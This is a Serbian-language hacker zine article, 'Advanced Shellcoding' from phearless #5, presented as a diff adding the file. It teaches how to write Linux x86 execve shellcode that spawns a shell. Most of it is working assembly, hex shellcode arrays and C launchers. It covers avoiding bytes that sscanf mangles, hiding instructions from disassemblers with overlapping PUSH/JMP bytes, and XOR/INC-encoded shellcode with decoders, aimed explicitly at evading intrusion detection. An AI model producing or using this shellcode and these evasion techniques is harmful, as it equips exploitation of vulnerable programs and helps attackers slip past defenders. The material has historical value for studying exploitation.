@@ -1,0 +1,773 @@
+                                
+                            ...................
+                      ...::: phearless zine #5 :::...                       
+
+......................>---[ Advanced Shellcoding ]---<......................
+
+.........................>---[ by BaCkSpAcE ]---<...........................
+                                                   sinisa86[at]gmail[dot]com               
+
+SADRZAJ:
+
+    [0]  Uvod
+    [1]  Zasto shellcode nekad ne radi
+    [2]  Najmanji potpuno ispravan execve() shellcode
+    [3]  Kako zbuniti disasemblere sa PUSH/JMP instrukcijama
+    [4]  Osnove enkriptovanja shellcoda
+    [5]  Literatura
+    [6]  Odvod
+
+///////////////////////////////////////////////////////////////////////////
+--==<[ 0. Uvod
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+
+    Shellcode predstavlja neki bajtkod, uglavnom mali, koji se koristi da bi 
+exploitali neki overflow, odnosno bug za cije exploitovanje je potrebno 
+promeniti tok izvrsavanja instrukcija programa (eip registar). Koliko god
+postoji tekstova na ovu temu, uvek ostane nesto nedoreceno, nedovrseno. Ja
+sam, citajuci te iste tekstove, primetio dosta stvari koje bih voleo da mi
+budu objasnjene. Tragajuci za resenjem, na kraju sam odlucio da podelim te
+moje rezultate sa svima, jer verujem da ima dosta "shellcodera" koji sigurno
+ne znaju bar jednu stvar iz ovog teksta.
+    Sto se tice potrebnog predznanja za ovaj tekst, to je naravno neizbezni
+asembler ;) Takodje, bilo bi pozeljno da znate (ali nije neophodno) da 
+napisete exploit za neki od overflowa, tipa buffer overflow, format string
+overflow i slicni, jer nema svrhe da znate da pisete shellcodove, a da ne
+znate da ih primenite ;) Ko je "malo zaboravio" kako se pisu shellcodovi,
+neka pogleda Shatterhandov tekst iz phearless zinea ph#2/0x0a.
+
+
+///////////////////////////////////////////////////////////////////////////
+--==<[ 1. Zasto shellcode nekad ne radi
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+
+    Shellcode, iako je ispravan i radi kada ga pokrenete u binarnom obliku,
+odnosno cim ga kompajlirate pomocu npr. nasm-a, on nece da radi kada ga
+"bacite u vatru", zato sto imate \x00 (hexadecimalno) u vasem shellcodu.
+To ste vec znali, je l' tako ;) E, a sad nesto sto sam primetio da dosta
+shellcodera ne zna, tj. neki specijalni slucajevi zbog kojih ce vas exploit
+a samim tim i shellcode, da zakaze... Evo jedan tipican shellcode koji ja
+koristim, a i vecina drugih ljudi pri exploitovanju neke ranjive aplikacije:
+
+      push byte 11
+      pop eax
+      cdq
+      push edx
+      push 0x68732f2f   ; guramo "//sh" na stack
+      push 0x6e69622f   ; guramo "/bin" na stack
+      push esp
+      pop ebx           ; punimo ebx sa adresom sadrzaja "/bin//sh"
+      push edx
+      push ebx
+      push esp
+      pop ecx           ; punimo ecx sa pokazivacem na adresu od "/bin//sh"
+      int 0x80          ; pozivamo kernel i prepustamo izvrsavanje funkcije
+
+    Ovaj shellcode je duzine 23 bajta i kada se kompajlira njegov kod u
+heksadecimalnom obliku izgleda ovako:
+
+char shellcode[] =      "\x6a\x0b\x58\x99\x52\x68\x2f\x2f"
+                        "\x73\x68\x68\x2f\x62\x69\x6e\x54"
+                        "\x5b\x52\x53\x54\x59\xcd\x80";
+
+    Kao sto vidite, shellcode mi je ostao smesten u jednoj promenljivoj,
+prvenstveno zato sto me mrzilo da uklanjam ove kose crte i x-eve, a 
+ionako cete ga ovako koristiti cesce ;) 
+    U ovom shellcodu je sve u redu (bar na prvi pogled), i radice u
+vecini exploita. Ali zasto nekad nece raditi? Pogledajte sledeci primer.
+
+      #include <stdio.h>
+      #include <string.h>
+
+      #define SCLEN 28
+
+      char shellcode[] =      "\x6a\x0b\x58\x99\x52\x68\x2f\x2f"
+                              "\x73\x68\x68\x2f\x62\x69\x6e\x54"
+                              "\x5b\x52\x53\x54\x59\xcd\x80";
+
+      main() {
+        int i;
+        char sc[SCLEN];  
+        void  (*fp) (void);
+
+        sprintf (sc, "%s", shellcode);
+
+        for (i=0; i<SCLEN; i++) printf ("%2x ", shellcode[i]);
+        printf ("\n\n");
+        for (i=0; i<SCLEN; i++) printf ("%2x ", sc[i]);
+  
+        fp = (void *) sc;
+        printf ("%d bytes\n", strlen(shellcode));
+        fp();
+      }
+
+    Kao sto vidite, ovaj program drzi originalan shellcode u shellcode[], a
+shellcode koji testiramo drzi u sc[]. Nakon toga ce da odstampa kako ce
+izgledati oba shellcoda u hexadecimalnom obliku. Na osnovu toga vi mozete
+da ih uporedite i da vidite razliku. Razlike u ovom gornjem primeru nece
+biti, i shellcode ce se normalno startovati. Medjutim, sta ce se desiti
+kada skinete komentar sa sscanf-a? Pa shellcode ce se promeniti, tj. onaj
+bajt \x0b ce da se promeni u \x00, i shellcode se nece pravilno izvrsiti!!!
+To isto se dogadja ako umesto \x0b stavimo \x09, \x0a, \x0c, \x0d. 
+    Sta sve ovo znaci? To znaci da ako exploitujete neki ranjivi kod u kojem
+ce vas shellcode morati da prodje kroz sscanf(), onda vas shellcode ne sme
+sadrzati 0a, 0b, 0c i 0d bajtove (u heksadecimalnom obliku), jer ce ih
+sscanf() zameniti sa 00!!! 
+    U ovom shellcodu koji sam vam ponudio problem predstavlja instrukcija
+push byte 11 ("\x6a\x0b"). Znaci problem mozemo resiti tako sto cemo da
+ovu instrukciju da zamenimo sa nekom drugom instrukcijom koja nece sadrzati
+sve ove "ilegalne" bajtove. Pogledajte sledeci primer:
+
+      backspace@bitbyterz# cat primer1.asm
+      push byte 10
+      pop eax
+      inc eax
+
+      backspace@bitbyterz# nasm primer1.asm
+      backspace@bitbyterz# hexdump -C primer1
+      "\x6a\x0a\x58\x40"
+
+Ovaj primer takodje ne dolazi u obzir zato sto je 'push byte 10' u binarnom
+obliku "\x6a\x0a". Ali zato mozemo da napravimo mali hack ovoga.
+
+      backspace@bitbyterz# cat primer2.asm
+      push byte 8
+      pop eax
+      inc eax
+      inc eax
+      inc eax
+
+      backspace@bitbyterz# nasm primer2.asm
+      backspace@bitbyterz# hexdump -C primer2
+      "\x6a\x08\x58\x40\x40\x40"
+
+Bingo!!! Ovaj kod konacno nema nijedan od onih "ilegalnih" bajtova. Probajte
+sada ovaj shellcode iskompajlirajte i ubacite umesto gornjeg shellcoda koji
+je dat u primeru:
+
+      push byte 8
+      pop eax
+      inc eax
+      inc eax
+      inc eax
+      cdq
+      push edx
+      push 0x68732f2f   ; guramo "//sh" na stack
+      push 0x6e69622f   ; guramo "/bin" na stack
+      push esp
+      pop ebx           ; punimo ebx sa adresom sadrzaja "/bin//sh"
+      push edx
+      push ebx
+      push esp
+      pop ecx           ; punimo ecx sa pokazivacem na adresu od "/bin//sh"
+      int 0x80          ; pozivamo kernel i prepustamo izvrsavanje funkcije
+
+Ovaj ce da radi bre ;) Kao sto vidite, iz prilicno ciste situacije izrodilo
+se nekoliko problematicnih bajtova. Licno mrzi me dalje da isprobavam koji
+bajt jos ne smete da upotrebljavate pri exploitovanju sscanf() funkcije,
+a i ne bi bilo l33t. Takodje ovaj shellcode moze da se optimizuje, da radi
+sa svim funkcijama, a da manje zauzima, ali bilo bi lame da vam jos i to
+pricam ovde... Ako razumete sve ovo sto sam rekao, verovatno cete znati
+dalje sami da nastavite!
+
+NAPOMENA: Ako vam slucajno shellcode ne radi na novim 2.6.x kernelima, to 
+je zato sto vam je prilikom kompajliranja kernela ukljucena opcija seccomp
+koja se nalazi u 'Processor type and features --> Enable seccomp to safely
+compute untrusted bytecode'. Resenje ovog problema je rekompajliranje 
+kernela sa iskljucenim seccomp-om, ili neki on-fly kernel patching ;)
+
+
+
+///////////////////////////////////////////////////////////////////////////
+--==<[ 2. Najmanji potpuno ispravan execve() shellcode
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+
+    Borba za najmanji execve() shellcode je dugo trajala, ali vec se doslo
+do nekih maksimuma. Najmanji shellcode koji sam ja video, iznosi 21 bajt,
+a tvorac tog shellcoda je zasta [zasta(at)darkircop(dot)org]. Medjutim, 
+najmanji shellcode cesto ne znaci i najispravniji... Kad smo vec kod toga, 
+upravo taj 'najmanji' shellcode radi, ali pod specificnim okolnostima ;) 
+Evo kako glasi taj najmanji shellcode:
+
+      xor ecx, ecx
+      mul ecx
+      add al, 11
+      push edx
+      push 0x6873612f
+      push 0x6e69622f
+      mov ebx, esp
+      int 0x80
+
+    Prvi uslov da bi ovaj shellcode radio jeste taj da ne exploitujemo neku
+aplikaciju kod koje ce nas buffer za smestanje shellcoda da prodje kroz
+sscanf() funkciju, kao sto smo videli u prvom poglavlju. Drugi uslov da bi
+ovaj shellcode radio je taj da na sistemu koji exploitujemo mora da bude
+instaliran /bin/ash shell, sto nije bas uobicajeno na POSIXcnim operativnim
+sistemima, vec se uglavnom naknadno ubacuje po zelji. Zasto bas /bin/ash ?
+Evo zasto. Kao sto vidite, ovaj shellcode drzi registar CX prazan (NULL),
+a po definiciji execve() funkcije, trebalo bi da stoji na tom mestu
+pokazivac na pokazivac (pointer to pointer) na string koji sadrzi ime tog
+shella. Da bi videli zasto ostali shellovi nece da rade bez pravilno
+popunjenog CX registra, a samo /bin/ash hoce, treba da zagrebemo malo ispod
+povrsine kernela, i da vidimo sta se tu desava prilikom poziva execve()
+sistemske funkcije.
+    Pozivanje execve() je ekvivalentno sistemskom pozivu sys_execve(). Evo
+kako radi sys_execve():
+
+[linux/arch/i386/kernel/process.c]
+...
+asmlinkage int sys_execve(struct pt_regs regs)
+{
+      int error;
+      char * filename;
+
+      filename = getname((char __user *) regs.ebx);
+      error = PTR_ERR(filename);
+      if (IS_ERR(filename))
+            goto out;
+      error = do_execve(filename,
+                  (char __user * __user *) regs.ecx,
+                  (char __user * __user *) regs.edx,
+                  &regs);
+...
+
+    Ovde vidimo da se promenljiva filename popunjava sa pokazivacem na
+adresu programa koji pokrecemo (EBX). Nas ECX koji nam je ovde od znacaja
+i koji sadrzi vrednost NULL, prosledjuje se funkciji do_execve() kao drugi
+parametar. Sada da vidimo sta se tamo zbiva:
+
+[linux/fs/exec.c]
+...
+int do_execve(char * filename, 
+        char __user *__user *argv, 
+        char __user *__user *envp, 
+        struct pt_regs * regs) 
+{
+        struct linux_binprm *bprm;
+      struct file *file;
+...
+      bprm->argc = count(argv, bprm->p / sizeof(void *));
+      if ((retval = bprm->argc) < 0)
+            goto out_mm;
+...
+
+    Izostavio sam veci deo ove funkcije zbog toga sto je vecina stvari nama
+bespotrebna, jedino sto nam ovde treba jeste ovaj red koji popunjava bprm
+strukturu, tacnije bprm->argc. Funkcija count racuna broj parametara u
+argv, i taj broj vraca u argc. Iz ovoga vidimo da ce agrv biti NULL, a argc
+ce biti 0! Upravo je to razlog zasto svi ostali shellovi padaju, a 'ash'
+ne pada! Ostali padaju zato sto nailaze na paradoksalne vrednosti parametara
+argv i argc, jer po pravilu bi trebao uvek da bude barem jedan parametar u
+argv (naziv samog programa), a prema tome argc bi trebalo da sadrzi vrednost
+jedan. Probajte da napravite sami neku malu 'ljusku' koja nece pasti ako
+je argv = NULL. Ili jednostavno probajte ovo:
+      
+      [ss.c]
+      #include <stdio.h>
+      main() { system ("ksh"); }
+      
+      backspace@bitbyterz# gcc ss.c -o ss
+      backspace@bitbyterz# cp ss /bin
+      
+Zatim ispravite prvi push u shellcodu, tako da pokazuje na /bin//ss. Znaci,
+na stack bi se gurali sledeci podaci:
+
+      ...
+      push 0x73732f2f
+      push 0x6e69622f
+      ...
+
+I probajte sada ovaj mali shellcode, i videcete da radi! Jedino nam sada
+ostaje da se nadamo da ce se u buducim verzijama bash-a i slicnih ljuski
+ispraviti ovaj "bug" kako bi mogli da koristimo jos manje shellcodove ;)
+    Prema tome, da li bi ovakav shellcode trebao da nosi naziv najmanjeg
+shellcoda? Po meni, najmanji shellcode bi pored toga sto je najmanji trebalo
+da bude i potpuno ispravan, a ne da bacamo grashke kada ce raditi, a kad ne.
+    Znaci, da bi napisali u potpunosti funkcionalan shellcode, a pritom i
+da tezimo i ka najmanjem, treba da pazimo na sledece stvari:
+ - da nam se ne pojavljuju \x00 bajtovi u shellcodu (ovo svi znaju ;)
+ - da nam se ne pojavljuju \x09, \x0a, \x0b, \x0c, \x0d bajtovi
+ - da prosledimo ispravne parametre execve() syscall-u
+ - da ne koristimo neke instrukcije ciji rezultati zavise od stanja nekih
+   registara i slicno
+
+    Ovaj poslednji uslov se prvenstveno odnosi na instrukciju cdq, jer je
+ona ovako vrlo primamljiva zato sto isprazni EDX registar, a zauzima samo
+jedan bajt, dok u normalnim situacijama za ovaj posao nam treba 2 bajta
+(xor edx, edx). Medjutim, ako je sadrzaj eax registra veci od 0x7FFFFFFF,
+onda se EDX umesto sa nulama napuni sa 'FF FF FF FF'. 
+    Ja sam pokusao da napisem neki shellcode koji ispunjava sve navedene
+uslove, i stigao sam do 26 bajtova. Verovatno moze da se napise jos manji,
+ali neka ostane nesto da vam golica mastu, ne bi li dobili malo zelje u
+trazenju manjem shellcoda. Evo kako on izgleda:
+
+      push byte 8 ; guramo 8 na stack, jer 9 ne smemo zbog \x09
+      pop eax
+      add al, 3         ; dodajemo na postojecih 8 jos 3 = 11 ;)
+      xor edx, edx      ; praznimo edx (eh, da je sad tu cdq ;)
+      push edx          ; guramo 4 null bajta iz eax na stack
+      push 0x68732f2f   ; guramo "//sh" na stack
+      push 0x6e69622f   ; guramo "/bin" na stack
+      push esp
+      pop ebx
+      push edx          ; guramo 4 null bajta iz eax na stack
+      push ebx          ; guramo ebx na stack
+      push esp
+      pop ecx
+      int 0x80          ; pozivamo kernel i prepustamo izvrsavanje funkcije
+
+    Ovaj shellcode mozete ubaciti bukvalno bilo gde, i svugde ce da radi ;)
+A usput nece ni da ucenjuje kao ovi prethodni, pa da trazi neke BogZnaKakve
+uslove za rad... "Neverne Tome" neka puste ovaj shellcode kroz bilo koju
+kvazinormalnu funkciju, pa neka se i sami uvere ;)
+
+      #include <stdio.h>
+
+      char shellcode[] =      "\x6a\x08\x58\x04\x03\x31\xd2\x52"
+                              "\x68\x2f\x2f\x73\x68\x68\x2f\x62"
+                              "\x69\x6e\x54\x5b\x52\x53\x54\x59"
+                              "\xcd\x80";
+
+      main() {
+        void  (*fp) (void);
+        fp = (void *) shellcode;
+        printf ("%d bytes\n", strlen(shellcode));
+        fp();
+      }
+
+
+
+///////////////////////////////////////////////////////////////////////////
+--==<[ 3. Kako zbuniti disasemblere sa PUSH/JMP instrukcijama
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+
+    Ono sto shellcodovima predstavlja najvecu glavobolju jesu IDSovi, tj.
+Intrusion Detection System, koji su u stanju da detektuju izvrsavanje nekog
+neprijateljski raspolozenog bytecoda. Takodje, tu su i disasembleri koji se
+trude da im nijedan bajt ne promakne, i da svaki lepo protumace. Tokom jedne 
+diskusije na forumu o navodjenju disasemblera na gresku (thx h4z4rd, deroko),
+pokusao sam i ja nesto da uradim na tu foru.
+    Za pocetak navescu jedan jednostavan nacin kako da sakrijete poslednja
+2-3 bajta. Posmatrajmo sledeci shellcode:
+
+      push byte 11      ; \x6A\x0B
+      pop eax           ; \x58
+      xor edx, edx      ; \x31\xD2
+      push edx          ; \x52
+      push 0x68732f2f   ; \x68\x2F\x2F\x73\x68
+      push 0x6e69622f   ; \x68\x2F\x62\x69\x6E
+      mov ebx, esp      ; \x89\xE3
+      push edx          ; \x52
+      push ebx          ; \x53
+      mov ecx, esp      ; \x89\xE1
+      int 0x80          ; \xCD\x80
+
+     Poslednja instrukcija je int 0x80, koja je inace i kljucna da bi ovaj
+shellcode uopste "pokusao" da proradi ;) Kako mozemo nju da sakrijemo? Pa 
+mozemo tako sto cemo ugraditi njen opcode i parametar unutar push instrukcije
+i tako ce disasembler nju videti samo kao push. Pomocu ovog nacina mozete
+teoretski da sakrijete 4 bajta, medjutim problem je sto neki disasembleri
+umeju da "prepolove" push, pa da je tumace kao push word, a druga dva bajta
+da disasembluju, sto nam nikako ne odgovara. Evo kako cemo onda sakriti
+int 0x80:
+
+  skok:
+      push 0xXX80CDXX
+      jmp skok+2
+
+    Kao sto vidite, ovaj 4-bajtni bytecode smo smestili u push instrukciju
+po 'little endian' redosledu, pa smo onda skocili na adresu skok+1. Koje je
+to mesto? Evo kako izgleda situacija:
+
+      skok  0x68
+      skok+1      0xXX
+      skok+2      0xCD
+      skok+3      0x80
+      skok+4      0xXX
+
+    Kao sto mozete primetiti, ovim skokom skacemo direktno na bajt 0xCD, koji
+ustvari predstavlja opcode int instrukcije. Umesto ovih bajtova XX moze da 
+bude bilo koji bajt, proizvoljno, jer je on tu samo da popuni mesto ;) Kada 
+kompajliramo ovaj shellcode i pokusamo da ga disasemblujemo pomocu ndisasm-a, 
+evo sta bi dobili:
+
+      backspace@bitbyterz# ndisasm -u shellcode
+      00000000  6A0B              push byte +0xb
+      00000002  58                pop eax
+      00000003  31D2              xor edx,edx
+      00000005  52                push edx
+      00000006  682F2F7368        push dword 0x68732f2f
+      0000000B  682F62696E        push dword 0x6e69622f
+      00000010  89E3              mov ebx,esp
+      00000012  52                push edx
+      00000013  53                push ebx
+      00000014  89E1              mov ecx,esp
+      00000016  6890CD8090        push dword 0x9080cd90
+      0000001B  EBFB              jmp short 0x18
+
+    Da li je dobro disasm rastumacio kod? Jeste, dobro je rastumacio, ali
+fora je u tome sto on ne vidi ono sto smo mi hteli da on ne vidi ;) a to
+je onaj jmp koji skace na 0x18 odakle pocinje int 0x80 instrukcija!!!
+    Ovo je mali pocetak, a sada da pokusamo neki veci zalogaj. Posmatramo
+sledeci kod:
+
+  crypt:
+      db 0x68
+      db 0x68
+      db 0x68
+      db 0x68
+      db 0x68
+      jmp crypt+3
+
+    Sta je 0x68? To je opcode push dword instrukcije, to znaci da se posle
+push opcoda ocekuju cetiri bajta koja ce se staviti na stack. Ovde se na
+stack stavlja \x68\x68\x68\x68. Zatim dolazi skok u sred push instrukcije.
+Sta nam to predstavlja? Evo da nacrtamo ovo malo lepse.
+
+      crypt db 0x68
+      crypt+1     db 0x68
+      crypt+2   db 0x68
+      crypt+3   db 0x68
+      crypt+4   db 0x68
+
+    Kada skocimo na crypt+3, skocicemo opet na 0x68 opcode (push dw), i
+onda bi on trebalo da pushne cetiri bajta, zar ne? Medjutim, zanimljivo je
+to sta ce on da gurne na stack. U ovom slucaju to ce biti \x68, zatim jos
+dva bajta od jmp crypt+3 instrukcije, i plus jos jedan bajt koji se nalazio
+posle jmp-a. Ovo mozemo da iskoristimo da prikrijemo instrukcije, i da
+zbunimo disasembler skroz. Sta cemo da uradimo? Ovako:
+
+  crypt:
+      db 0x68
+      db 0x68
+      db 0x68
+      db 0x68           ; ovo je pozicija [crypt+3]
+      db 0x68
+      jmp crypt+3       ; dvobajtna instrukcija
+      db 0x68           ; opcode push dw instrukcije
+
+Kako bi se ovo videlo u disasembleru?
+
+      push 0x68686868   ; \x68\x68\x68\x68\x68
+      jmp short 0x3     ; \xEB\xFC
+      push [shellcode]  ; \x68 i jos cetiri bajta od naseg shellcoda
+
+    Sada ova poslednja instrukcije db 0x68 (push dw), ocekuje jos cetiri
+bajta da baci na stack, i tako dalje. Medjutim, u realnosti program
+nikada nece stici do tog koraka. Zasto? Zato sto jmp skace u sred push
+instrukcije, i menja se ceo tok programa. Posle jump instrukcije,
+program ce ici ovim redosledom:
+
+      jmp short 0x3
+      ...
+      push 0x68EBFC68
+      [shellcode]
+
+    I sada ce nas shellcode da nastavi da se izvrsava bez problema, iako
+ce disasembleri da vide nesto sasvim deseto. Evo kako bi izgledao sada
+shellcode kada ubacimo ovaj dodatak:
+
+  crypt:
+      db 0x68
+      db 0x68
+      db 0x68
+      db 0x68           ; crypt+3
+      db 0x68
+      jmp crypt+3
+      db 0x68           ; MAGIC_BYTE: ovaj bajt dovodi disasm do ludila
+
+      push byte 11      ; odavde pocinje shellcode
+      pop eax
+      xor edx, edx
+      push edx
+      push 0x68732f2f
+      push 0x6e69622f
+      mov ebx, esp
+      push edx
+      push ebx
+      mov ecx, esp
+      int 0x80
+
+    Probajte da kompajlirate ovaj shellcode, pa da ga disasemblujete. Evo
+kakve sam ja rezultate dobio sa ndisasm-om:
+
+      backspace@bitbyterz# ndisasm -u crypt_sc
+      00000000  6868686868        push dword 0x68686868
+      00000005  EBFC              jmp short 0x3
+      00000007  686A0B5831        push dword 0x31580b6a
+      0000000C  D25268            rcl byte [edx+0x68],cl
+      0000000F  2F                das
+      00000010  2F                das
+      00000011  7368              jnc 0x7b
+      00000013  682F62696E        push dword 0x6e69622f
+      00000018  89E3              mov ebx,esp
+      0000001A  52                push edx
+      0000001B  53                push ebx
+      0000001C  89E1              mov ecx,esp
+      0000001E  CD80              int 0x80
+
+    Kao sto vidite, vecina koda je izmesana, tek se na mov instrukciji
+disasembler vratio na kolosek. Moze dalje da se steluje da se ne vidi
+ni dalji kod, ali umesto toga, uradicu nesto drugo. Iskoristicu onaj
+prostor koji smo na samom pocetku popunjavali sa \x68. Tu cemo da
+smestimo int 0x80 instrukciju. Posle te modifikacije, shellcode ce
+izgledati ovako:
+
+  crypt:
+      db 0x68           ; opcode push dw instrukcije
+      db 0xcd           ; crypt+1, opcode od instrukcije int
+      db 0x80           ; broj interapta koji se poziva
+      db 0x68           ; crypt+3
+      db 0x68
+      jmp crypt+3
+      db 0x68           ; MAGIC_BYTE: ovaj bajt dovodi disasm do ludila
+
+      push byte 11      ; odavde pocinje shellcode
+      pop eax
+      xor edx, edx
+      push edx
+      push 0x68732f2f
+      push 0x6e69622f
+      mov ebx, esp
+      push edx
+      push ebx
+      mov ecx, esp
+      jmp crypt+1 ; skace na adresu gde je sakrivena int 0x80
+
+    Mozete ovaj shellcode dalje da doteravate tako sto cete ugradjivati
+jos ovih 'crypt' delova, ali to ostaje na vama. Takodje, mozete menjati
+ovaj MAGIC_BYTE, tako sto cete menjati njegovu vrednost u opcode neke
+druge instrukcije. U obzir ne dolaze jednobajtne instrukcije tipa inc,
+pop, push reg, nop... vec samo vise bajtne instrukcije. Evo liste koju
+ja koristim:
+
+      2-bajtna: \x31
+      3-bajtna: \xD2
+      4-bajtna: \x68 (push dw) ili \xE9 (jmp)
+      ...
+
+    U zavisnosti od toga da li je instrukcija 2-bajtna, 3-bajtna ili
+4-bajtna, ona ce da krade redom 1, 2 ili 3 bajta. Zbog toga disasm
+ne moze lepo da rastumaci kod. Na vama je da kombinujete.
+
+
+
+///////////////////////////////////////////////////////////////////////////
+--==<[ 4. Osnove enkriptovanja shellcoda
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+
+    Sledeci korak koji bi mogli da napravimo u poboljsanju shellcoda jeste
+enkriptovanje istog! Postoje razni nacini kako se to moze uraditi, ali svi
+se svode na isto. Svaki 'encrypted' shellcode sadrzi prvo jedan blok gde
+se nalazi pravi shellcode encodovan na neki nacin, i drugi blok koji sluzi
+da dekriptuje prvi blok, i da izvrsi pravi shellcode koji je bio skriven.
+Evo kako bi izgledao blok diagram ovog shellcoda:
+
+      enkriptovani shellcode
+                |
+                |
+                V
+        decryptor shellcoda
+                |
+                |
+                V
+         loader shellcoda
+
+    Treba napomenuti da enkriptovani shellcode mora da bude gurnut na stack
+tj. treba ga smestiti u par push instrukcija, i to je to. Razmatracemo jedan
+shellcode od 24 bajta:
+
+      push byte 11
+      pop eax
+      xor edx, edx
+      push edx
+      push 0x68732f2f
+      push 0x6e69622f
+      mov ebx, esp
+      push edx
+      push ebx
+      mov ecx, esp
+      int 0x80
+
+    Sada cemo ovaj shellcode staviti u nekoliko push instrukcija i napraviti
+jedan takav funkcionalan shellcode prema prethodnom blok diagramu:
+
+      ;shellcode
+      push 0x80cde189    ; pocetak naseg shellcoda
+      push 0x5352e389
+      push 0x6e69622f
+      push 0x6868732f
+      push 0x2f6852d2
+      push 0x31580b6a
+      push byte 0x18    ; informacija o duzini shellcoda, 0x18 = 24 bytes
+      pop ecx
+
+      ;decrypter
+      
+      ;loader
+      push esp
+      ret
+
+    Ovo je najjednostavniji shellcode prema nasem blok diagramu koji nije
+enkriptovan. U sustini, na osnovu ovog shellcoda nastale su brojne druge
+"mutacije" na internetu gde se one samo razlikuju prema nacinu enkriptovanja
+shellcoda. Evo kako ja vidim i razvrstavam te razlicite nacine enkriptovanja:
+
+      - linearno (ADD, SUB, INC, DEC)
+      - shiftovanje (SHR, SHL)
+      - ekskluzivno OR (XOR)
+      - "prava" enkripcija dobijena kombinacijom ostalih metoda iza koje
+        stoji veoma slozen matematicki aparat
+
+    Mislim da se svi slazemo da je najlakse objasniti osnovni princip rada
+ovakvih shellcodova na nekom najprostijem primeru, a to je u ovom slucaju
+inc (ili dec).
+    Uzecemo gorepomenuti shellcode, i povecacemo svaki njegov bajt za 1,
+tj. radicemo enkripciju pomocu instrukcije INC. Nakon toga, moramo staviti
+neki dekriptor koji ce smanjiti svaki bajt shellcoda za jedan na stacku, i
+na kraju cemo pokrenuti taj modifikovani shellcode. My way:
+
+      ;shellcode
+      push 0x81cee28a
+      push 0x5453e48a
+      push 0x6f6a6330
+      push 0x69697430
+      push 0x306953d3
+      push 0x32590c6b
+      push byte 0x18
+      pop ecx
+
+      ;decrypter
+    decrypter:
+      dec byte [esp+ecx]    ; smanjuje vrednost podatka na stacku za jedan
+      dec ecx               ; smanjuje ecx da bi pokazivao na sledeci bajt
+      jns decrypter
+      
+      ;loader
+      push esp
+      ret      
+
+    Evo, to je prva uspesna verzija enkriptovanog shellcoda! Sada dalje
+moze da se usavrsava ovaj kod tako sto cemo praviti neke bolje enkriptore.
+Ja se necu mnogo zadrzavati oko toga, to je vasa volja kako cete nesto da
+enkriptujete, vec cu vam dati primer kako mozete da koristite XOR instr.
+kao nacin enkripcije. Za ovu priliku vam dajem jedan program koji ce vas
+vec postojeci shellcode da enkriptuje pomocu XOR-a, znaci automatizuje
+posao za vas. Ovaj i svi ostali fajlovi koje sada budem koristio, nalaze
+se encodovani na kraju ovog fajla.
+    Za pocetak nam treba neki shellcode. Uzecemo onda opet onaj nas 
+shellcode od 24 bajta, i kompajliracemo ga:
+
+      backspace@bitbyterz# nasm shellcode.asm -f bin
+      backspace@bitbyterz# gcc xorencrypt.c -o xorencrypt
+      backspace@bitbyterz# ./xorencrypt
+      usage: xorencrypt <shellcode file> <output file> <xor byte (1-255)>
+
+      backspace@bitbyterz# ./xorencrypt shellcode izlaz 4
+      No NULL bytes were found when xoring with 4!
+
+    Sada je nas shellcode smesten u fajlu izlaz. Zatim cemo njegov sadrzaj
+u heksadecimalnom obliku upisati u push-eve, ali u obrnutom redosledu, kao
+sto je to radjeno i u prethodnim primerima. Nas shellcode bi trebao da
+izgleda ovako:
+
+      ;shellcode
+      push 0x84c9e58d
+      push 0x5756e78d
+      push 0x6a6d662b
+      push 0x6c6c772b
+      push 0x2b6c56d6
+      push 0x355c0f6e
+      push byte 0x18
+      pop ecx
+            
+      ;decrypter
+    decrypter:
+      xor byte [esp+ecx], 4    ; ovde se vrsi dekriptovanje pomocu xor-a
+      dec ecx                  ; sa parametrom 4 koji smo izabrali kada smo
+      jns decrypter            ; pokretali ./xorencrypt
+                  
+      ;runner
+      push esp
+      ret
+
+    Naravno, ako ne bi napisali parametar 4, vec neki drugi, shellcode se
+ne bi lepo dekriptovao, pa bi izbacio 'Segmentation Fault'. Eto, sada vam
+ostavljam ovaj xorencrypt da pokusate i sami (za domaci ;) da napravite
+svoj xor-enkriptovani shellcode ;)
+
+
+
+///////////////////////////////////////////////////////////////////////////
+--==<[ 5. Literatura
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+
+(1)  How IT Works
+     Rodrigo Rubira Branco
+     http://www.bsdaemon.org
+
+(2)  Najmanji shellcode (21 byte)
+     zasta   
+     zasta[at]darkircop[dot]org
+
+(3)  execve() shellcode, encoded by +1, 39 bytes
+     izik
+     izik[at]tty64[dot].org
+
+
+///////////////////////////////////////////////////////////////////////////
+--==<[ 6. Odvod
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+
+    Znate sta? Hteo sam da pisem jos nekih stvari, ali stvarno vise ne mogu
+jer me smorilo ucenje za fax i tako to, pa sam jedva i ovo napisao jer mi
+je oduzelo prilicno vremena. Nadam se da to vreme nece biti izgubljeno, i da
+ce neko umeti ovo da iskoristi i upotrebi svoju kreativnost i inteligenciju
+u daljem razvoju shellcodova. Sada imate dosta materijala za proucavanje i 
+pravljenje vasih boljih modifikovanih verzija shellcodova, koje cete nadam
+se, kao i ja, podeliti sa ostalim shellcode frikovima ;)
+
+greetz to: **W**, d0lphin, De1Rekt0n, BORG, SSnaVe, bl00d, Shatterhand,
+           Earthquake, deroko, sunnis, DownBload, BoyScout, hazard, HitMan, 
+         Exoduks, Re00t, lesh, ACidCooKie i svim ostalim clanovima grupa
+         sa kojima je bilo divno druziti se (Serbian Security Team i
+         bSecurity Team)... i svima ostalima kojih se nisam setio...
+
+    Posebno se zahvaljujem mojoj devojci koja redovno cita moje tekstove
+i koja mi daje snage i volje za dalji rad. Takodje poseban pozdrav mojim 
+cimerima koji su trpili zvuk kompjutera i tastature dok kucam, jer se taj 
+"tretman" neretko znao oduziti do 5-6 sati ujutro ;) 
+
+
+begin 644 advshell.tar.bz2
